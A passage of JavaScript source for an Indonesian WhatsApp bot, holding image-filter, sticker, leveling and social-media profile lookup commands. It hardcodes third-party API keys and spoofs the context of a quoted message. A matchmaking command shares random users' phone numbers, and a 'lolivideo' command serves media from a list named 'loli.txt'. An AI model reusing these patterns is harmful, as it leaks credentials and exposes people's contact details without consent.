                ])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                    dimas.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkiri.jpg'), image, {quoted: msg, caption: `Jangan malas pak...`})
                    
                })
            }
                break
            case 'foliokanan':{
                
                if (args.length < 2) return reply(`Kirim perintah *${prefix}foliokanan* teks`)
                reply(mess.wait)
                const tulisan = body.slice(12)
                const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
                const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
                spawn('convert', [
                    './media/nulis/images/folio/sebelumkanan.jpg',
                    '-font',
                    './media/nulis/font/Indie-Flower.ttf',
                    '-size',
                    '960x1280',
                    '-pointsize',
                    '23',
                    '-interline-spacing',
                    '3',
                    '-annotate',
                    '+89+190',
                    fixHeight,
                    './media/nulis/images/folio/setelahkanan.jpg'
                ])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                    dimas.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkanan.jpg'), image, {quoted: msg, caption: `Jangan malas pak...`})
                    
                })
            }
                break
                case 'rulesgc':
gcc = fs.readFileSync('./media/Nakano.jpg')
const pebz2 = {
            contextInfo: {
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast',
            isForwarded: true,
            forwardingScore: 8,
           quotedMessage: {
           imageMessage: {
           caption: '-999999',gcc,
           mimetype: 'image/jpeg',
           }
           }
           }
           } 
           dimas.sendMessage(from, `
*「 PERATURAN BOT 」*

1. DILARANG TELFON BOT!!
2. DILARANG SPAM BOT
3. DILARANG BERKATA KASAR
4. DILARANG SPAM VIRTEX
5. DILARANG TELEFON OWNER
6. DILARANG SPAM GROUP
7. DILARANG SPAM ADMIN
8. DILARANG BERKATA KASAR DI GC

⚠️JIKA KALIAN MELANGGAR.. AKAN DI BLOCK + BANNED!!`, text, pebz2)
           break 
//IMAGE MANIPULASI
case 'darkjoke': 
                
                buff = await getBuffer(`http://lolhuman.herokuapp.com/api/meme/darkjoke?apikey=IkyAds`, {method: 'get'})
                buttons = [{buttonId: `!infoig`,buttonText:{displayText: ` Suport OWNER`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Created by Dimas', imageMessage: imageMsg,
              contentText:`Follow @Dimas Edr`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
break
 case 'wasted':
                    var imgbb = require('imgbb-uploader')
                    if ((isMedia && !dim.message.videoMessage || isQuotedImage) && args.length == 0) {
                        ger = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
                        owgi = await dimas.downloadAndSaveMediaMessage(ger)
                        data = await imgbb("16721ac29279183de385d717c663e681", owgi)
                        buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/wasted?url=${data.display_url}&apikey=IkyOgiwara`)
                        dimas.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
                    } else {
                        reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}wasted`)
                    }
                    break
                     case 'picture':
                    var imgbb = require('imgbb-uploader')
                    if ((isMedia && !dim.message.videoMessage || isQuotedImage) && args.length == 0) {
                        ger = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
                        owgi = await dimas.downloadAndSaveMediaMessage(ger)
                        data = await imgbb("16721ac29279183de385d717c663e681", owgi)
                        buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/picture?url=${data.display_url}&apikey=IkyOgiwara`)
                        dimas.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
                    } else {
                        reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}picture`)
                    }
                    break
 case 'affect':
                    var imgbb = require('imgbb-uploader')
                    if ((isMedia && !dim.message.videoMessage || isQuotedImage) && args.length == 0) {
                        ger = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
                        owgi = await dimas.downloadAndSaveMediaMessage(ger)
                        data = await imgbb("16721ac29279183de385d717c663e681", owgi)
                        buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/affect?url=${data.display_url}&apikey=IkyOgiwara`)
                        dimas.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
                    } else {
                        reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}affect`)
                    }
                    break
                case 'invert':
                    var imgbb = require('imgbb-uploader')
                    if ((isMedia && !dim.message.videoMessage || isQuotedImage) && args.length == 0) {
                        ger = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
                        owgi = await dimas.downloadAndSaveMediaMessage(ger)
                        data = await imgbb("16721ac29279183de385d717c663e681", owgi)
                        buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/invert?url=${data.display_url}&apikey=IkyOgiwara`)
                        dimas.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
                    } else {
                        reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}invert`)
                    }
                    break
                case 'firework':
                    var imgbb = require('imgbb-uploader')
                    if ((isMedia && !dim.message.videoMessage || isQuotedImage) && args.length == 0) {
                        ger = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
                        owgi = await dimas.downloadAndSaveMediaMessage(ger)
                        data = await imgbb("16721ac29279183de385d717c663e681", owgi)
                        anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/img/firework?url=${data.display_url}&apikey=IkyOgiwara`)
                        buff = await getBuffer(anu.result.url)
                        dimas.sendMessage(from, buff, video, {quoted: freply, caption: mess.success})
                    } else {
                        reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}firework`)
                    }
                    break
                case 'sepia':
                    var imgbb = require('imgbb-uploader')
                    if ((isMedia && !dim.message.videoMessage || isQuotedImage) && args.length == 0) {
                        ger = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
                        owgi = await dimas.downloadAndSaveMediaMessage(ger)
                        data = await imgbb("16721ac29279183de385d717c663e681", owgi)
                        buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/sepia?url=${data.display_url}&apikey=IkyOgiwara`)
                        dimas.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
                    } else {
                        reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}sepia`)
                    }
                    break
            case 'blur':
                    var imgbb = require('imgbb-uploader')
                    if ((isMedia && !dim.message.videoMessage || isQuotedImage) && args.length == 0) {
                        ger = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
                        owgi = await dimas.downloadAndSaveMediaMessage(ger)
                        data = await imgbb("16721ac29279183de385d717c663e681", owgi)
                        buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/blur?url=${data.display_url}&level=20&apikey=IkyOgiwara`)
                        dimas.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
                    } else {
                        reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}blur`)
                    }
                    break
                case 'circle':
                    var imgbb = require('imgbb-uploader')
                    if ((isMedia && !dim.message.videoMessage || isQuotedImage) && args.length == 0) {
                        ger = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
                        owgi = await dimas.downloadAndSaveMediaMessage(ger)
                        data = await imgbb("16721ac29279183de385d717c663e681", owgi)
                        buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/circle?url=${data.display_url}&apikey=IkyOgiwara`)
                        dimas.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
                    } else {
                        reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}circle`)
                    }
                    break
                    case 'gtav':
    if (!isRegistered) return reply(ind.noregis())
                //if (isLimit(sender)) return reply(ind.limitend(pusname))
                //if (isLimit(sender)) return reply(ind.limitend(pusname))
                //if (isBanned) return reply('Maaf kamu sudah terbenned!')
    var imgbb = require('imgbb-uploader')
    if ((isMedia && !dim.message.videoMessage || isQuotedImage) && args.length == 0) {
      ted = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: dim
      reply('please wait...')
      owgi = await dimas.downloadAndSaveMediaMessage(ted)
      tels = body.slice(7)
      anu = await imgbb("16721ac29279183de385d717c663e681", owgi)
      hehe = await getBuffer(`https://videfikri.com/api/textmaker/gtavposter/?urlgbr=${anu.display_url}`)
     dimas.sendMessage(from, hehe, image, {quoted:freply})
    } else {
      reply('Jangan tambah kan apapun pada command')
    }
    break
    case 'covidindo':
                //if (!isRegistered) return reply( ind.noregis())
                //if (isLimit(sender)) return reply(ind.limitend(pusname))
                //if (isBanned) return reply('Maaf kamu sudah terbenned!')
                reply('Wait...')
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/corona/indonesia?apikey=${lol}`)
                    get_result = get_result.result
                    ini_txt = `Positif : ${get_result.positif}\n`
                    ini_txt += `Sembuh : ${get_result.sembuh}\n`
                    ini_txt += `Dirawat : ${get_result.dirawat}\n`
                    ini_txt += `Meninggal : ${get_result.meninggal}`
                    reply(ini_txt)
                    break
                  case 'trash':
                    var imgbb = require('imgbb-uploader')
                    if ((isMedia && !dim.message.videoMessage || isQuotedImage) && args.length == 0) {
                        ger = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
                        owgi = await dimas.downloadAndSaveMediaMessage(ger)
                        data = await imgbb("16721ac29279183de385d717c663e681", owgi)
                        buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/trash?url=${data.display_url}&apikey=IkyOgiwara`)
                        dimas.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
                    } else {
                        reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}trash`)
                    }
                    break
                    case 'wiki':
                    anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/wiki?kata=${q}&apikey=IkyOgiwara`)
                    dimas.sendMessage(from, `「 RESULT FOUND 」\n• Hasil Pencarian Dari: ${anu.result.from}\n• Hasil: ${anu.result.hasil}`, text, {quoted: freply})
                    break
                  case 'wanted':
                    var imgbb = require('imgbb-uploader')
                    if ((isMedia && !dim.message.videoMessage || isQuotedImage) && args.length == 0) {
                        ger = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
                        owgi = await dimas.downloadAndSaveMediaMessage(ger)
                        data = await imgbb("16721ac29279183de385d717c663e681", owgi)
                        buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/wanted?url=${data.display_url}&apikey=IkyOgiwara`)
                        dimas.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
                    } else {
                        reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}wanted`)
                    }
                    break
                    case 'covidglobal':
                //if (!isRegistered) return reply( ind.noregis())
                //if (isLimit(sender)) return reply(ind.limitend(pusname))
                //if (isBanned) return reply('Maaf kamu sudah terbenned!')
                reply(mess.wait)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/corona/global?apikey=${lol}`)
                    get_result = get_result.result
                    ini_txt = `Positif : ${get_result.positif}\n`
                    ini_txt += `Sembuh : ${get_result.sembuh}\n`
                    ini_txt += `Dirawat : ${get_result.dirawat}\n`
                    ini_txt += `Meninggal : ${get_result.meninggal}`
                    reply(ini_txt)
                    break
                    case 'joke':
                    var imgbb = require('imgbb-uploader')
                    if ((isMedia && !dim.message.videoMessage || isQuotedImage) && args.length == 0) {
                        ger = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
                        owgi = await dimas.downloadAndSaveMediaMessage(ger)
                        data = await imgbb("16721ac29279183de385d717c663e681", owgi)
                        buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/joke?url=${data.display_url}&apikey=IkyOgiwara`)
                        dimas.sendMessage(from, buff, image, {quoted: freply, caption: mess.success})
                    } else {
                        reply(`Kirim foto atau reply foto yang sudah dikirim, dengan caption ${prefix}joke`)
                    }
                    break 
                    case 'ffimg':
                if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:dim})
                  anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=freefire`, {method: 'get'})
                    reply(mess.wait)
                    var n = JSON.parse(JSON.stringify(anu));
                    var nimek =  n[Math.floor(Math.random() * n.length)];
                    buff = await getBuffer(nimek)
                  buttons = [{buttonId: `${prefix + command} ${query}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'@ M I Z U K I  B O T', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
        break  
        case 'swasted':
                if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:dim})
if (dim.message.extendedTextMessage != undefined || dim.message.extendedTextMessage != null) {
ger = JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo
reply(mess.wait)
owgi = await dimas.downloadMediaMessage(ger)
await fs.writeFileSync(`./stickwasted.jpeg`, owgi)
var imgbb = require('imgbb-uploader')
anu = await imgbb("16721ac29279183de385d717c663e681", './stickwasted.jpeg')
teks = `${anu.display_url}`
anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/creator/imagemaker?endPoint=wasted&imgUrl=${teks}&apikey=hardianto`)
dimas.sendMessage(from, anu, sticker, {quoted:dim})
fs.unlinkSync('./stickwasted.jpeg')
}
//reply('Udah kakak.....')
break               
//------------------< Level >-------------------
      case 'level': 
                              if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})

              if (!isLevelingOn) return await reply('Fitur leveling belum diaktifkan!')
              let userLevel = level.getLevelingLevel(sender, _level)
              let userXp = level.getLevelingXp(sender, _level)
              let requiredXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
              let userRank = level.getUserRank(sender, _level)
              try {
              profilePic = await dimas.getProfilePicture(sender)
              } catch {
              profilePic = errorImg
}
              buffer = await getBuffer(`https://lolhuman.herokuapp.com/api/rank?apikey=${setting.lolkey}&img=${profilePic}&background=https://telegra.ph/file/443b6600636aed1d94acd.jpg&username=${encodeURI(pushname)}&level=${userLevel}&ranking=${Number(userRank)}&currxp=${userXp}&xpneed=${requiredXp}`)
              teks = `*「 LEVEL 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${userXp} / ${requiredXp}\n➸ *Level :* ${userLevel}\n➸ *Role*: *${role}*\n\n*Note : Kumpulin Xp Jika Ingin Menaikkan Level*`
              dimas.sendMessage(from, buffer, image, { caption: teks, quoted: freply})
              break
       case 'leaderboard': //Cek Leaderboard
       case 'leaderboards':
                              if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})

              if (!isLevelingOn) return await reply('Fitur leveling belum diaktifkan!') 
              const resp = _level
            _level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
              let leaderboard =  '-----[ *LEADERBOARD* ]----\n\n'
              try {
              for (let i = 0; i < 10; i++) {
              var roles = 'Warrior III'
              if (resp[i].level <= 5) {
              roles = 'Warrior II'
              } else if (resp[i].level <= 10) {
              roles = 'Warrior I'
              } else if (resp[i].level <= 15) {
              roles = 'Elite III'
              } else if (resp[i].level <= 20) {
              roles = 'Elite II'
              } else if (resp[i].level <= 25) {
              roles = 'Elite I'
              } else if (resp[i].level <= 30) {
              roles = 'Master III'
              } else if (resp[i].level <= 35) {
              roles = 'Master II'
              } else if (resp[i].level <= 40) {
              roles = 'Master I'
              } else if (resp[i].level <= 45) {
              roles = 'GrandMaster III'
              } else if (resp[i].level <= 50) {
              roles = 'GrandMaster II'
              } else if (resp[i].level <= 55) {
              roles = 'GrandMaster I'
              } else if (resp[i].level <= 60) {
              roles = 'Epic III'
              } else if (resp[i].level <= 65) {
              roles = 'Epic II'
              } else if (resp[i].level <= 70) {
              roles = 'Epic I'
              } else if (resp[i].level <= 75) {
              roles = 'Legend III'
              } else if (resp[i].level <= 80) {
              roles = 'Legend II'
              } else if (resp[i].level <= 85) {
              roles = 'Legend I'
              } else if (resp[i].level <= 90) {
              roles = 'Mythic'
              } else if (resp[i].level <= 95) {
              roles = 'Mythical Glory'
              } else if (resp[i].level >= 100) {
              roles = 'Immortal'
} 

              leaderboard += `➸ ${i + 1}. wa.me/${_level[i].id.replace('@s.whatsapp.net', '')}\n➸ *Xp :* ${_level[i].xp}\n➸ *Level :* ${_level[i].level}\n➸ *Role :* ${roles}\n\n`
}
              reply(leaderboard)
              } catch (err) {
              console.error(err)
              reply('_Perlu setidaknya 10 user yang memiliki level di database!_')
}
              break
//------------------< Stalk >-------------------
      case 'stalkgithub':
      case 'githubstalk':
              if (args.length == 0) return reply(`Example: ${prefix + command} dimas-chan02`)
              reply(mess.wait)
              username = args[0]
              ini_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${username}?apikey=${setting.lolkey}`)
              ini_result = ini_result.result
              ini_buffer = await getBuffer(ini_result.avatar)
              ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *GITHUB USER*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Username : ${ini_result.name}\`\`\`
\`\`\`▢ Public Repo : ${ini_result.public_repos}\`\`\`
\`\`\`▢ Public Gists : ${ini_result.public_gists}\`\`\`
\`\`\`▢ Pengikut : ${ini_result.followers}\`\`\`
\`\`\`▢ Following : ${ini_result.following}\`\`\`
\`\`\`▢ Mengikuti : ${ini_result.bio}\`\`\`
\`\`\`▢ Link : ${ini_result.url}\`\`\`
`
             dimas.sendMessage(from, ini_buffer, image, { caption: ini_txt, thumbnail: Buffer.alloc(0) })
             break
      case 'stalkig':
      case 'igstalk':
             if (args.length == 0) return reply(`Example: ${prefix + command} dimas.chan26`)
             reply(mess.wait)
             username = args[0]
             ini_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=${setting.lolkey}`)
             ini_result = ini_result.result
             ini_buffer = await getBuffer(ini_result.photo_profile)
             ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *INSTAGRAM PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Username : ${ini_result.username}\`\`\`
\`\`\`▢ Nama : ${ini_result.fullname}\`\`\`
\`\`\`▢ Pengikut : ${ini_result.followers}\`\`\`
\`\`\`▢ Mengikuti : ${ini_result.following}\`\`\`
\`\`\`▢ Deskripsi : ${ini_result.bio}\`\`\`
\`\`\`▢ Link : https://instagram.com/${ini_result.username}\`\`\`
`
             dimas.sendMessage(from, ini_buffer, image, { caption: ini_txt, thumbnail: Buffer.alloc(0) })
             break
      case 'stalktiktok':
      case 'tiktokstalk':
             if (args.length == 0) return reply(`Example: ${prefix + command} marz.hiatus`)
             reply(mess.wait)
             stalk_toktok = args[0]
             get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalktiktok/${stalk_toktok}?apikey=${setting.lolkey}`)
             get_result = get_result.result
             pp_tt = await getBuffer(get_result.user_picture)
             ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *TIKTOK PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`▢ Username : ${get_result.username}\`\`\`
\`\`\`▢ Nama : ${get_result.nickname}\`\`\`
\`\`\`▢ Pengikut : ${get_result.followers}\`\`\`
\`\`\`▢ Mengikuti : ${get_result.followings}\`\`\`
\`\`\`▢ Likes : ${get_result.likes}\`\`\`
\`\`\`▢ Video : ${get_result.video}\`\`\`
\`\`\`▢ Deskripsi : ${get_result.bio}\`\`\`
`
              dimas.sendMessage(from, pp_tt, image, { quoted: dim, caption: ini_txt, thumbnail: Buffer.alloc(0) })
              break
       case 'iguser':
              try {
              if (args.length == 0) return reply(`Kirim perintah *${prefix}iguser [ username ]*\nContoh : ${prefix}iguser jessnolimit`)
              query = args.join(" ")
              reply(mess.wait)
              get_result = await fetchJson(`https://api.zeks.xyz/api/iguser?apikey=${setting.zekskey}&q=${query}`)
              get_result = get_result.result
              teks = `*「 INSTAGRAM USER 」*\n\n*Hasil Pencarian : ${query}*\n\n`
              for(let i = 0; i < get_result.length; i++) {
              teks += `*Username* : ${get_result[i].username}\n*Full name*: ${get_result[i].full_name}\n*Akun private* : ${get_result[i].private_user}\n*Verified*: ${get_result[i].verified_user}\n*Link*: https://instagram.com/${get_result[i].username}\n\n`
}
              ini_buffer = await getBuffer(get_result[0].profile_pic)
              dimas.sendMessage(from, ini_buffer, image, { quoted: dim, caption: teks })
              } catch {
              reply(`Maaf username ${query} tidak ditemukan`)
}
              break
//------------------< Sticker/Tools >-------------------

                case 'mutual':
                case 'carijodoh':
                // ZX.BOT 
                //if (!isRegistered) return reply(ind.noregis())
                //if (isBanned) return reply('Maaf kamu sudah terbenned!')
                //if (isLimit(sender)) return reply(ind.limitend(pusname))
                if (isGroup) return  reply( 'Command ini tidak bisa digunakan di dalam grup!')
                anug = getRegisteredRandomId(register).replace('@s.whatsapp.net','')
                //await limitAdd(sender)
                 sendButMessage(from, `[ *_PARTNER DITEMUKAN_* ]\n\nwa.me/${anug}`, `*_Klik next untuk partner selanjutnya_*`, [
          {
            buttonId: `${prefix}mutual`,
            buttonText: {
              displayText: `⬡ NEXT `,
            },
            type: 1,
          },
        ]);
                break

       case 'dadu': // by CHIKAA CHANTEKKXXZZ
              reply(mess.wait)
              dadu()
             .then(async (body) => {
              dadugerak = body.split('\n')
              dadugerakx = dadugerak[Math.floor(Math.random() * dadugerak.length)]
              sendWebp(from, dadugerakx)
})
             .catch(async (err) => {
              console.error(err)
              reply('Error!')
})
              break
      case 'doge':
              reply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              sendWebp(from, pjr)
}
)
              break
       case 'patrick':
              reply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              sendWebp(from, pjr)
}
)
              break
       case 'gura':
       case 'gawrgura':
              reply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
             .then(res => res.text())
             .then(body => {
              let tod = body.split("\n");
              let pjr = tod[Math.floor(Math.random() * tod.length)];
              sendWebp(from, pjr)
}
)
              break
       case 'animestick':
       case 'stickeranime':
              reply(mess.wait)
              fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
             .then(res => res.text())
             .then(body => {
              let todd = body.split("\n");
              let pjrr = todd[Math.floor(Math.random() * todd.length)];
              sendWebp(from, pjrr)
}
)
              break
       case 'telesticker': 
       case 'telestiker':
              if (!q) return reply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
              reply(mess.wait)
              ini_url = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=${setting.lolkey}&url=${args[0]}`)
              ini_sticker = ini_url.result.sticker
              reply('Sending '+ ini_sticker.length +' stickers...')
              for (sticker_ in ini_sticker) {
              ini_buffer = await getBuffer(ini_sticker[sticker_])
              dimas.sendMessage(from, ini_buffer, sticker, {})
}
              break
       case 'o':
      // case 'emoji':
                  if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})
              if (args.length == 0) return reply(`Example: ${prefix + command} ðŸ˜­`)
              emoji = args[0]
              try {
              emoji = encodeURI(emoji[0])
              } catch {
              emoji = encodeURI(emoji)
 }
              ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${emoji}?apikey=${setting.lolkey}`)
              await dimas.sendMessage(from, ini_buffer, sticker, { quoted: dim })
              break
              case 'emoji':
              case 'smoji':
//if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
if (!q) return reply(`Example : ${prefix + command} 😗`)
     reply('On process....')
qes = args.join(' ')
emoji.get(`${qes}`).then(emoji => {
teks = `${emoji.images[4].url}`

sendStickerUrl(from,`${teks}`, {quoted:freply}) 
//moji = await getBuffer(teks)
//await dimas.sendMessage(from, `${teks}`, sticker, { quoted: dim }) 
console.log(teks)
})
//limitAdd(sender, limit)
break
case 'ttp':
                case 'ttp2':
                case 'ttp3':
                case 'ttp4':
                case 'attp':
                         if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:freply})
               // if (isLimit(sender)) return reply(ind.limitend(pusname))
               // if (isBanned) return reply('Maaf kamu sudah terbenned!')
              //  reply(ind.wait())
                    if (args.length == 0) return reply(`Example: ${prefix + command} DI.MAS`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/${command}?apikey=${lol}&text=${ini_txt}`)
                    dimas.sendMessage(from, ini_buffer, sticker, { quoted: freply })

                break
case 'ttp1':
if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix} ${pushname}`)
woy = args.join(" ")
reply('wait....')
anjay = `http://zekais-api.herokuapp.com/text2png?text=${woy}&color=white`
sendStickerUrl(from, anjay)
break
       case 'attp2':
              if (args.length == 0) return reply(`Example: ${prefix + command} dimas`)
              buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
              dimas.sendMessage(from, buffer, sticker, { quoted: dim })
              break
       case 'ttg':
              if (!q) return await reply(mess.wrongFormat)
              reply(mess.wait)
              sendWebp(from, `https://api.vhtear.com/textxgif?text=${q}&apikey=${setting.vhtearkey}`)
             .then(() => console.log('Success creating GIF!'))
             .catch(async (err) => {
              console.error(err)
              reply('Error!')
})
              break
       case 'loliv':
       case 'lolivid':
       case 'lolivideo':
              reply(mess.wait)
              anu = await fetchText('https://raw.githubusercontent.com/AlvioAdjiJanuar/random/main/loli.txt')
             .then(async (body) => {
              anu = body.split('\n')
              anu = anu[Math.floor(Math.random() * anu.length)]
              sendMediaURL(from, anu)
})
             .catch(async (err) => {
              console.error(err)
              reply(`${err}`)
})
              break
              case 's':
       case 'sticker':
       case 'stiker':
                                if (!isRegistered) return sendButMessage(from, maaf, mod, tombar,{quoted:freply})

       //await reply('Maaf fitur dalam perbaikan..')
                  // if (!isPremium) return sendButMessage(from, harusvip, goprem, torem, {quoted:dim})
              var a = 'Mozuki Botz'
              var b = 'By:Alwi Gans'
              if (isMedia && !dim.message.videoMessage || isQuotedImage ) {
              const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
              media = await dimas.downloadAndSaveMediaMessage(encmedia)
              await createExif(a,b)
              out = getRandom('.webp')
              ffmpeg(media)
             .on('error', (e) => {
              console.log(e)
              dimas.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: dim })
              fs.unlinkSync(media)
})
             .on('end', () => {
            _out = getRandom('.webp')
              spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
             .on('exit', () => {
              dimas.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: dim })
              fs.unlinkSync(out)
              fs.unlinkSync(_out)
              fs.unlinkSync(media)
})
})
             .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
             .toFormat('webp')
             .save(out) 
              } else if ((isMedia && dim.message.videoMessage.seconds < 11 || isQuotedVideo && dim.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
              const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dim).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dim
              const media = await dimas.downloadAndSaveMediaMessage(encmedia)
              pe = args.join('')
             var a = '@MIZUKI BOT'
              var b = '@ALWI OFC'
              await createExif(a,b)
              out = getRandom('.webp')
              ffmpeg(media)
             .on('error', (e) => {
              console.log(e)
              dimas.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: dim })
              fs.unlinkSync(media)
})
             .on('end', () => {
            _out = getRandom('.webp')
              spawn('webpmux', ['-set','exif','./sticker/data.exif', out, '-o', _out])
             .on('exit', () => {
              dimas.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: dim })
              fs.unlinkSync(out)
              fs.unlinkSync(_out)
              fs.unlinkSync(media)
})
})
